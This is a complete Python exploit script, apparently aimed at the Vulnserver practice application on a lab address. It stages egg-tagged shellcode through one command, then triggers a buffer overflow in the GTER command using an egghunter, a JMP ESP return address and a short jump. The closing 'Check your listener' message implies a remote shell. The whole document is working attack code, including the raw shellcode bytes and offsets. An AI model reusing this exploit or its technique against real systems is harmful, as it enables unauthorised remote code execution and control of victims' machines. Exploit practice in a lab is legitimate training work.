#!/usr/bin/python

import sys, time, socket

ip = "192.168.82.128"
port = 9999


# Bad characters: \x00\x0a\x0d
shellcode = ( "T00WT00W" +  
"\xdb\xc9\xd9\x74\x24\xf4\xbf\xc9\xf8\x27\x43\x5d\x31\xc9\xb1"
"\x52\x83\xc5\x04\x31\x7d\x13\x03\xb4\xeb\xc5\xb6\xba\xe4\x88"
"\x39\x42\xf5\xec\xb0\xa7\xc4\x2c\xa6\xac\x77\x9d\xac\xe0\x7b"
"\x56\xe0\x10\x0f\x1a\x2d\x17\xb8\x91\x0b\x16\x39\x89\x68\x39"
"\xb9\xd0\xbc\x99\x80\x1a\xb1\xd8\xc5\x47\x38\x88\x9e\x0c\xef"
"\x3c\xaa\x59\x2c\xb7\xe0\x4c\x34\x24\xb0\x6f\x15\xfb\xca\x29"
"\xb5\xfa\x1f\x42\xfc\xe4\x7c\x6f\xb6\x9f\xb7\x1b\x49\x49\x86"
"\xe4\xe6\xb4\x26\x17\xf6\xf1\x81\xc8\x8d\x0b\xf2\x75\x96\xc8"
"\x88\xa1\x13\xca\x2b\x21\x83\x36\xcd\xe6\x52\xbd\xc1\x43\x10"
"\x99\xc5\x52\xf5\x92\xf2\xdf\xf8\x74\x73\x9b\xde\x50\xdf\x7f"
"\x7e\xc1\x85\x2e\x7f\x11\x66\x8e\x25\x5a\x8b\xdb\x57\x01\xc4"
"\x28\x5a\xb9\x14\x27\xed\xca\x26\xe8\x45\x44\x0b\x61\x40\x93"
"\x6c\x58\x34\x0b\x93\x63\x45\x02\x50\x37\x15\x3c\x71\x38\xfe"
"\xbc\x7e\xed\x51\xec\xd0\x5e\x12\x5c\x91\x0e\xfa\xb6\x1e\x70"
"\x1a\xb9\xf4\x19\xb1\x40\x9f\xe5\xee\x18\xde\x8e\xec\x9c\xe1"
"\xf5\x78\x7a\x8b\x19\x2d\xd5\x24\x83\x74\xad\xd5\x4c\xa3\xc8"
"\xd6\xc7\x40\x2d\x98\x2f\x2c\x3d\x4d\xc0\x7b\x1f\xd8\xdf\x51"
"\x37\x86\x72\x3e\xc7\xc1\x6e\xe9\x90\x86\x41\xe0\x74\x3b\xfb"
"\x5a\x6a\xc6\x9d\xa5\x2e\x1d\x5e\x2b\xaf\xd0\xda\x0f\xbf\x2c"
"\xe2\x0b\xeb\xe0\xb5\xc5\x45\x47\x6c\xa4\x3f\x11\xc3\x6e\xd7"
"\xe4\x2f\xb1\xa1\xe8\x65\x47\x4d\x58\xd0\x1e\x72\x55\xb4\x96"
"\x0b\x8b\x24\x58\xc6\x0f\x54\x13\x4a\x39\xfd\xfa\x1f\x7b\x60"
"\xfd\xca\xb8\x9d\x7e\xfe\x40\x5a\x9e\x8b\x45\x26\x18\x60\x34"
"\x37\xcd\x86\xeb\x38\xc4")


# Added to egghunter for shellcode to functions
# "\x57" POP EDI
# "\x5c" PUSH ESP
# "\xff\xe7" JMP EDI

# Egg: W00TW00T
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")


# Buffer size: 5005 bytes
# EIP overwrite [*] Exact match at offset 147
# essfunc.dll JMP ESP: 625011AF
# JMP SHORT 0186F970: \xeb\x8e
evil = "\x90" * (147 - len(egghunter) - 8) + egghunter + "\x90" * 8 + "\xaf\x11\x50\x62" + "\xeb\xc4"


buffer = "GTER /.:/" + evil + "\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.send("RTIME " + shellcode)
s.close()
time.sleep(1)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.recv(1024)
s.send(buffer)
s.close()
print "[*] Payload sent.  Check your listener."

